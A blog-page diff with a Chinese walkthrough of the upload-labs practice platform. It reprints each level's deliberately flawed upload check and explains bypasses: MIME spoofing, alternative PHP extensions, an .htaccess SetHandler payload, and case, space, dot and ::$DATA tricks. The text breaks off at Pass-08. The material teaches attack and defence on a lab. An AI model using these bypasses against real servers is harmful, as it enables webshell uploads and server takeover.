@@ -1,0 +1,1031 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>文件上传漏洞 练习平台upload-labs | MambaInVeins Blog</title><meta name="keywords" content="漏洞"><meta name="author" content="MambaInVeins"><meta name="copyright" content="MambaInVeins"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="文件上传漏洞练习平台 upload-labshttps:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs 参考链接https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_44426869&#x2F;article&#x2F;details&#x2F;104236854#t3 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2435 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Lmg66&#x2F;p&#x2F;13272575.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞 练习平台upload-labs">
+<meta property="og:url" content="http://mambainveins.gitee.io/mambainveins/2021/05/14/2021/2021-05-14-upload_labs/index.html">
+<meta property="og:site_name" content="MambaInVeins Blog">
+<meta property="og:description" content="文件上传漏洞练习平台 upload-labshttps:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs 参考链接https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_44426869&#x2F;article&#x2F;details&#x2F;104236854#t3 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2435 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Lmg66&#x2F;p&#x2F;13272575.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0142.png">
+<meta property="article:published_time" content="2021-05-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-06-14T02:01:44.237Z">
+<meta property="article:author" content="MambaInVeins">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0142.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://mambainveins.gitee.io/mambainveins/2021/05/14/2021/2021-05-14-upload_labs/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: MambaInVeins","link":"链接: ","source":"来源: MambaInVeins Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-06-14 10:01:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}const fontSizeVal = saveToLocal.get('global-font-size')
+if (fontSizeVal !== undefined) {
+  document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+}})()</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/MambaInVeins.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">243</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">96</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">32</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/moment"><i class="fa-fw fas fa-comment-alt"></i><span> 碎语</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 常用链接</span></a></div><div class="menus_item"><a class="site-page" href="/box"><i class="fa-fw fas fa-box"></i><span> 工具箱</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0142.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">MambaInVeins Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/moment"><i class="fa-fw fas fa-comment-alt"></i><span> 碎语</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 常用链接</span></a></div><div class="menus_item"><a class="site-page" href="/box"><i class="fa-fw fas fa-box"></i><span> 工具箱</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">文件上传漏洞 练习平台upload-labs</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-13T16:00:00.000Z" title="发表于 2021-05-14 00:00:00">2021-05-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-06-14T02:01:44.237Z" title="更新于 2021-06-14 10:01:44">2021-06-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">漏洞学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>36分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="练习平台-upload-labs"><a href="#练习平台-upload-labs" class="headerlink" title="练习平台 upload-labs"></a>练习平台 upload-labs</h2><pre><code>https://github.com/c0ny1/upload-labs</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><pre><code>https://blog.csdn.net/weixin_44426869/article/details/104236854#t3
+https://xz.aliyun.com/t/2435
+https://www.cnblogs.com/Lmg66/p/13272575.html?utm_source=tuicool
+https://blog.csdn.net/weixin_44677409/article/details/92799366#t17</code></pre>
+<p><img src="https://lmg66.github.io/img/3.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/2019110311215233.png"></p>
+<h2 id="Pass-01-客户端js检查"><a href="#Pass-01-客户端js检查" class="headerlink" title="Pass-01 客户端js检查"></a>Pass-01 客户端js检查</h2><p>源码：</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+    function checkFile() &#123;
+        var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;
+        if (file == null || file == &quot;&quot;) &#123;
+            alert(&quot;请选择要上传的文件!&quot;);
+            return false;
+        &#125;
+        //定义允许上传的文件类型
+        var allow_ext = &quot;.jpg|.png|.gif&quot;;
+        //提取上传文件的类型
+        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
+        //判断上传文件类型是否允许上传
+        if (allow_ext.indexOf(ext_name) == -1) &#123;
+            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+            alert(errMsg);
+            return false;
+        &#125;
+    &#125;
+&lt;/script&gt;</code></pre>
+<p>客户端js检查，打开F12可以看到页面上有js代码，可以直接修改不调用该js或者修改js满足类型需求，也可以在上传时bp修改类型。</p>
+<h2 id="Pass-02-MIME-Type验证"><a href="#Pass-02-MIME-Type验证" class="headerlink" title="Pass-02 MIME-Type验证"></a>Pass-02 MIME-Type验证</h2><p>源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]            
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;文件类型不正确，请重新上传！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<p>MIME-Type介绍：</p>
+<pre><code>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</code></pre>
+<p>仅仅判断content-type类型，因此上传1.php抓包修改content-type为图片类型：image/jpeg、image/png、image/gif</p>
+<h2 id="Pass-03-黑名单验证，后缀名"><a href="#Pass-03-黑名单验证，后缀名" class="headerlink" title="Pass-03 黑名单验证，后缀名"></a>Pass-03 黑名单验证，后缀名</h2><p>源码：</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA，php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名
+        $file_ext = trim($file_ext); //收尾去空
+
+        if(!in_array($file_ext, $deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            
+            if (move_uploaded_file($temp_file,$img_path)) &#123;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<p>用黑名单不允许上传.asp,.aspx,.php,.jsp后缀的文件，但可以上传.phtml .phps .php5 .pht</p>
+<p>前提是apache的httpd.conf中有如下配置代码，才可以解析</p>
+<pre><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code></pre>
+<p>因此抓包修改为1.php5上传，回复包里有上传路径。</p>
+<h2 id="Pass-04-黑名单-htaccess绕过"><a href="#Pass-04-黑名单-htaccess绕过" class="headerlink" title="Pass-04 黑名单 .htaccess绕过"></a>Pass-04 黑名单 .htaccess绕过</h2><p>源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //收尾去空
+
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;此文件不允许上传!&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<p>黑名单拒绝了几乎所有有问题的后缀名，禁止的有点多，除了.htaccess</p>
+<p>htaccess文件介绍：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。前提条件（1.mod_rewrite模块开启。2.AllowOverride All）</p>
+<p>因此先上传一个.htaccess文件，内容如下：</p>
+<pre><code>SetHandler application/x-httpd-php </code></pre>
+<p>设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则报错。</p>
+<p>再上传图片马即可。</p>
+<h2 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h2><p>源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;此文件类型不允许上传！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<p>相比于pass-4，过滤了.htaccess，但将后缀转换为小写去掉了，因此可以使用大小绕过</p>
+<p>大小写绕过原理：</p>
+<pre><code>Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的。
+Linux系统下，对于文件名中的大小写敏感。例如：test.php和 TesT.php就是不一样的。</code></pre>
+<h2 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h2><p>源码：</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file,$img_path)) &#123;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;此文件不允许上传&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<p>相比于前两题，这题没有对后缀名进行去空，因此可以在后缀名加空格绕过</p>
+<p>原理:windows等系统下，文件后缀加空格命名之后是默认自动删除空格。查看网站源代码发现过滤了大小写，没用过滤空格。</p>
+<h2 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h2><p>源码:</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;此文件类型不允许上传！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<p>原理:同空格绕过原理一样，主要原因是windows等系统默认删除文件后缀的.,可在后缀名中加”.”绕过</p>
+<h2 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08 ::$DATA绕过"></a>Pass-08 ::$DATA绕过</h2><p>源码：</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
